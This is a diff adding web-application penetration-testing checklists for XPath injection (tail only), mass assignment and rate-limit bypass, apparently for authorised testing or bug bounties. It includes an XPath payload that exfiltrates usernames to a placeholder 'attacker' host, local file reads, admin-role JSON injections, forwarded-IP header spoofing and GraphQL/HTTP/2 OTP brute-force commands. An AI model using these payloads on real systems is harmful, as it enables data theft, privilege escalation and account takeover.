+* [ ] **Codepoint per char (robust):** `and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1))=105` (→ "i", codepoints.net)
+* [ ] Count all values: `count(//user/node())`
+* [ ] Enumerate attributes/comments: `count(/@*)`, `count(/comment())`
+
+***
+
+### 6. Out-of-Band & Error-Based (faster than boolean)
+
+* [ ] **OOB exfil via `doc()`** (XXE-style external fetch): `doc(concat("http://attacker/oob/", //user[1]/username))`
+  * URI-safe: `doc(concat("http://attacker/oob/", encode-for-uri(//user[1]/username)))`
+* [ ] **`doc-available()` boolean oracle:** `doc-available(concat("http://attacker/oob/", RESULTS))` → true/false on whether the URL resolved; `not(doc-available(...))` to invert
+* [ ] **Error-based oracle:** `... and (if($employee/role=2) then error() else 0)` — `error()` throws only when the condition is true (binary signal via 500)
+* [ ] OOB collapses extraction from thousands of requests to a handful (data in the DNS/HTTP callback)
+
+***
+
+### 7. File Read (XPath 2.0 / engine-dependent)
+
+* [ ] `doc('file://protected/secret.xml')` → read a local XML file the app shouldn't expose
+* [ ] Blind variant: `(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1)) < 127`
+* [ ] Chain to OOB to exfil the file contents
+* [ ] (Capability depends on the XPath engine — test `doc()`/`doc-available()` support first)
+
+***
+
+### 8. Tooling
+
+* [ ] **xcat** — automated blind XPath extraction (`xcat run <url> <param> <param=val> --true-string='...'`)
+* [ ] **recon-ng** XPath bruteforcer
+* [ ] **xpath-blind-explorer**
+* [ ] Burp Intruder / custom Python for the boolean oracle walk
+* [ ] codepoints.net for codepoint↔char mapping
+
+***
+
+### 9. Confirm Impact
+
+* [ ] Authentication bypass (log in as user/admin)
+* [ ] Full document extraction (every node — XPath has no access control, so all data in the XML is reachable)
+* [ ] Sensitive value theft (passwords/hashes/tokens) char-by-char or via OOB
+* [ ] Local file read via `doc('file://...')`
+* [ ] SSRF/OOB via `doc()` external fetch
+* [ ] Re-verify on a clean request; document the param, the query context (what's quoted, what's appended), the bypass/extraction payload, and the data recovered
+
+</details>
+
+<details>
+
+<summary>Mass Assignment</summary>
+
+> Run these boxes against any create/update endpoint that binds user-supplied JSON/form data straight onto a server-side model (a.k.a. **autobinding** in Spring MVC / ASP.NET MVC, **object injection** in PHP/Rails `params`). The bug: the model has sensitive fields (`isAdmin`, `role`, `balance`, `email_verified`, `org_id`) the form never exposes, but the binder accepts them if you add them → privilege escalation, data tampering, cross-tenant access. Order: find binding endpoints → baseline → discover hidden fields → inject privilege/process/internal fields → param-mine/fuzz → cross-object (org/tenant) → confirm.
+
+***
+
+### 0. Find Candidate Endpoints (create/update + autobind)
+
+* [ ] All create/update requests: `POST`/`PUT`/`PATCH` on users, profiles, orgs, settings, carts, orders
+* [ ] Signup, profile-edit, account-update, company/team settings, invite flows
+* [ ] **Bracket-syntax** param names are a strong indicator of object binding: `user[email]`, `user[role]`
+* [ ] Frameworks prone to it: Spring MVC, ASP.NET MVC, Rails (`params`), Laravel (`$fillable`/`$guarded`), Sequelize/Mongoose, Django (`**request.data`)
+* [ ] Download front-end bundles + `*.map` — leaked role strings, field names, feature flags to replay
+* [ ] (crAPI workflow) proxy via Burp/FoxyProxy, intercept the registration/update request, send to Repeater
+
+***
+
+### 1. Baseline First
+
+* [ ] Submit a legit, successful request in Repeater → record the exact response (status, body, which fields echo back)
+* [ ] Note every field the **response** returns that the **request** didn't send — those are server-set fields and prime mass-assignment targets (response-to-request mirroring)
+* [ ] Keep a clean collection/copy so you don't corrupt the original requests
+
+***
+
+### 2. Discover Hidden / Sensitive Fields
+
+* [ ] **Mirror the GET/response into the write request:** copy fields a `GET /me` returns (`role`, `isAdmin`, `verified`, `id`, `org`) into your `POST`/`PUT`/`PATCH`
+* [ ] **Source/docs review** if available (model definitions reveal exact field names — the highest-signal source)
+* [ ] **Bundle grep** for role/permission strings (`isAdmin`, `is_staff`, `superuser`, `ROLE_`)
+* [ ] **Param Miner** (Burp ext): right-click request → "Guess params" → check Output tab → insert any discovered params back into the request and fuzz
+* [ ] **Add a non-existent attribute** and watch the response — an error or behavior change reveals the binder validates/rejects unknown fields (or silently accepts)
+
+***
+
+### 3. Privilege-Escalation Fields (permission properties)
+
+> Should only be settable by privileged users.
+
+* [ ] `"isAdmin": true` / `"isAdmin": "true"` / `"admin": 1` / `"admin": true`
+* [ ] `"role": "admin"` / `"role": "ROLE_ADMIN"` / `"roles": ["admin"]`
+* [ ] `"is_staff": true`, `"isSuperUser": true`, `"superuser": true`
+* [ ] `"approved": true`, `"is_active": true`, `"permissions": [...]`, `"group": "administrators"`
+* [ ] Form/array syntax variants: `user[role]=admin`, `isAdmin=true`, `user[isAdmin]=true`
+* [ ] Spring/ASP.NET classic: `userid=x&password=y&email=z&isAdmin=true`
+* [ ] Submit and check: did the account get elevated? (re-fetch the profile / try an admin action)
+
+***
+
+### 4. Process-Dependent & Internal Fields
+
+> Should only be set by the server after a process completes, or never from outside.
+
+* [ ] **Process-dependent:** `"email_verified": true`, `"verified": true`, `"status": "active"`, `"balance": 9999`, `"credit": 1000`, `"paid": true`, `"subscription": "premium"`, `"emailConfirmed": true`
+* [ ] **Internal:** `"id": <other>`, `"user_id": <other>`, `"created_at"`, `"updated_at"`, `"uuid"`, `"price": 0`
+* [ ] Skip-payment / bypass-verification angle: set `email_verified`/`status`/`paid` at registration to short-circuit a flow
+* [ ] Tamper price/quantity/discount on order/cart create-update (`"price": 1`, `"discount": 100`)
+
+***
+
+### 5. Fuzz Field Names & Values (Intruder / Param Miner)
+
+* [ ] Intruder **cluster bomb**: position 1 = field name (`isadmin`/`admin`/`role`/`is_staff`…), position 2 = value (`true`/`1`/`"true"`/`admin`) → review for unique responses
+* [ ] Wordlists of common sensitive field names + boolean/role values
+* [ ] Try casing/format variants the binder might accept: `isAdmin`/`is_admin`/`IsAdmin`, `true`/`1`/`"1"`/`yes`
+* [ ] Watch for response-length/status differences signalling a field took effect
+
+***
+
+### 6. Cross-Object / Tenant Mass Assignment (beyond isAdmin)
+
+> Mass assignment isn't only privilege escalation — it can move you between orgs/tenants.
+
+* [ ] If user objects reference an org/group/tenant, add/override it: `"org": <victim-org>`, `"org_id": <id>`, `"team_id": <id>`, `"company": <id>`, `"tenant": <id>` → fuzz the value to land in another org
+* [ ] Assign yourself to a group/role you shouldn't be in: `"groups": ["admins"]`, `"memberOf": [...]`
+* [ ] Re-point ownership: `"owner_id"`, `"author_id"`, `"account_id"` to access/modify others' resources (overlaps IDOR/BOLA)
+* [ ] Test update endpoints for **other objects** too: group info, company profile, billing, settings — not just the user object
+* [ ] (Historic) the GitHub-2012 case: mass-assign an SSH key onto an arbitrary org
+
+***
+
+### 7. Confirm Impact
+
+* [ ] Privilege escalation (became admin / elevated role) — verify with an admin-only action
+* [ ] Verification/payment bypass (`email_verified`/`status`/`paid` set without the process)
+* [ ] Cross-tenant / cross-org access (joined or read another org)
+* [ ] Financial tampering (price/balance/discount changed)
+* [ ] Ownership reassignment → access to others' resources
+* [ ] Re-verify on a clean account; document the endpoint, the injected field(s) + value, how you discovered them (mirror/source/Param Miner), and the privilege/data gained
+
+</details>
+
+<details>
+
+<summary>Rate Limit Bypass</summary>
+
+> Run these boxes against any throttled action (login, OTP/2FA verify, password-reset, signup, coupon/redeem, API calls). Rate limits are keyed on _something_ — IP, header, account/session, endpoint+params, or a CDN PoP counter. The bypass is to change whatever the counter keys on so each request looks new, or to collapse many logical attempts into one request (GraphQL aliasing / HTTP/2 multiplexing). Order: find the limited action + identify the key → IP/header spoofing → path/param variation → value/byte/case mutation → identity rotation → batch (GraphQL/HTTP2) → CDN/origin → tooling → confirm.
+
+> Rate-limit bypass is usually only impactful when it **unlocks something** — OTP/2FA brute-force, credential stuffing, reset-token guessing, coupon abuse. Pair it with the target action; a raw "no rate limit" is often low/info severity on its own.
+
+***
+
+### 0. Find the Limited Action & Identify the Key
+
+* [ ] Locate throttled endpoints: login, `/verify` (OTP/2FA), `/forgot-password`, signup, redeem/coupon, search, API
+* [ ] Hit it repeatedly until blocked — note the response (429, 403, "too many attempts", lockout)
+* [ ] Work out what the limit keys on: source IP? a header? the account? the session/cookie? endpoint+params? global?
+* [ ] Note the window (per-minute/hour) and whether a successful action resets the counter
+
+***
+
+### 1. IP-Origin Spoofing Headers
+
+> If the limit is per-IP and the app trusts a forwarded-IP header, spoof it.
+
+*   [ ] Add one per request (rotate the value each attempt):
+
+    ```
+    X-Forwarded-For: 127.0.0.1
+    X-Originating-IP: 127.0.0.1
+    X-Remote-IP: 127.0.0.1
+    X-Remote-Addr: 127.0.0.1
+    X-Client-IP: 127.0.0.1
+    X-Host: 127.0.0.1
+    X-Forwarded-Host: 127.0.0.1
+    X-Real-IP: 127.0.0.1
+    ```
+*   [ ] **Double `X-Forwarded-For`** (some parsers read the wrong one):
+
+    ```
+    X-Forwarded-For: X-Forwarded-For: 127.0.0.1
+    ```
+* [ ] Rotate the spoofed IP every N tries (match the observed limit, e.g. new IP each 10)
+* [ ] Try the header on the _first_ request too (some apps only read it when present)
+
+***
+
+### 2. Endpoint / Path Variation
+
+> Limiter often keys on the exact path — vary it so it looks like a different endpoint while hitting the same handler.
+
+* [ ] **Trailing slash:** `/v1/login` → `/v1/login/`
+* [ ] **Case variation** (if path not normalized): `/login` → `/Login` → `/logiN`
+* [ ] **Path/version alternatives:** `/api/v1/sign-up`, `/api/v3/sign-up`, `/api/sign-up`, `/SignUp`, `/singup`
+* [ ] **Path confusion + the&#x20;**_**unprotected**_**&#x20;upstream path:** if the limiter guards `/verify` but not `/api/v2/verify`, hit the latter
+* [ ] Encoding in the path: `/login%2f`, `//login`, `/./login`
+
+***
+
+### 3. Parameter Variation
+
+> Some gateways key on endpoint+params. Make each request unique by adding/altering params.
+
+* [ ] **Add a junk param:** `/resetpwd?someparam=1`, `/forgot-password?fake=1`
+* [ ] Add a junk body param: `email=victim@x.com&alsofake=2`
+* [ ] Vary an insignificant param's value each request
+* [ ] Duplicate the real param (HPP): `email=victim@x.com&email=victim@x.com`
+
+***
+
+### 4. Value / Byte / Case Mutation (when limit keys on the value, e.g. email/code)
+
+> If the block is per-email/per-username, mutate the value so it's "different" to the limiter but identical to the mailbox/account.
+
+* [ ] **Trailing space** (not URL-encoded): `email=victim@x.com`
+* [ ] **Null byte / blank bytes:** append `%00`, `%0d`, `%0a`, `%09`, `%0c`, `%20` to the value or endpoint
+* [ ] **Newline:** `victim@x.com%0a`
+* [ ] **Case variation:** `Victim@x.com`, `VICTIM@x.com`, `victim@X.com`
+* [ ] **Gmail tricks** (same mailbox, different string): `victim+1@gmail.com`, `v.ic.tim@gmail.com`
+* [ ] Burn the allowed tries per variation, then move to the next (`a@x.com`×5, `a@x.com` ×5, …)
+
+***
+
+### 5. Identity Rotation (per-account / per-session limits)
+
+* [ ] **Change/clear cookies** each request (session-keyed limit)
+* [ ] **Rotate User-Agent** (UA-keyed limit) — Intruder over a UA list
+* [ ] **Spoof Referer** (rare, but some limit on it)
+* [ ] **Re-login to reset the counter:** some apps reset on successful auth — Burp **Pitchfork** to rotate creds every few attempts, with _follow redirects_ on
+* [ ] **Distribute across accounts/sessions:** spread the attack over multiple accounts or guest sessions / tokens
+* [ ] Change anything else that fingerprints you (device IDs, client tokens)
+
+***
+
+### 6. Batch / High-Speed Bypass (collapse many attempts into one)
+
+> The limiter counts _requests_, but one request can carry many logical attempts.
+
+*   [ ] **GraphQL aliasing** — send many mutations/queries in one request via aliases; server runs all, limiter counts one:
+
+    ```graphql
+    mutation { a: login(code:"0000"){ok} b: login(code:"0001"){ok} c: login(code:"0002"){ok} ... }
+    ```
+
+    Reliable for OTP/login/reset throttling.
+*   [ ] **HTTP/2 multiplexing** — many requests in one connection; tune Turbo Intruder `requestsPerConnection` 100–1000:
+
+    ```
+    seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
+      -H "Content-Type: application/json" -d '{"code":"@"}' https://target/api/v2/verify
+    ```
+* [ ] **Last-byte-sync race** (single-packet attack) — fire concurrently to beat the counter (see race-condition checklist)
+* [ ] Combine path-confusion (§2) + HTTP/2 for very fast OTP/credential brute-force
+
+***
+
+### 7. CDN / Origin-Level Bypass
+
+* [ ] **Hit the origin IP directly** — if you can find the backend IP (DNS history, SSL cert, misconfig), bypass the CDN/WAF limiter entirely
+* [ ] CDN counters are often **PoP-local** — distributing across regions/proxies dilutes a per-PoP limit
+* [ ] WebSocket endpoints may not be covered by the same WAF rate rules — check if the action is reachable over WS
+
+***
+
+### 8. Tooling
+
+* [ ] **fireprox** — disposable AWS API Gateway endpoints, every request a new source IP (kills IP-based throttling)
+* [ ] **Burp IP-Rotate** extension — rotates source IP via AWS API Gateway (needs Jython)
+* [ ] **Turbo Intruder** — HTTP/2 multiplexing, high concurrency
+* [ ] **429 Bypasser** (Burp ext) — automates several of these mutations
+* [ ] **hashtag-fuzz** — header randomization + round-robin proxy rotation
+* [ ] **ffuf** with rotating proxies; VPN/Tor/proxy pools
+* [ ] Burp Intruder Pitchfork/Sniper for credential/param/UA rotation
+
+***
+
+### 9. Confirm Impact
+
+* [ ] Bypass demonstrated: requests succeed past the documented limit (show the count)
+* [ ] Tie it to a real attack: OTP/2FA brute-force, credential stuffing, reset-token guessing, coupon/referral abuse, enumeration
+* [ ] Note which key the bypass defeats (IP/header/account/endpoint/CDN) and the achieved rate
+* [ ] Re-verify on a clean session; document the limited action, the bypass technique, requests/sec achieved, and the downstream impact unlocked
+
+</details>
+
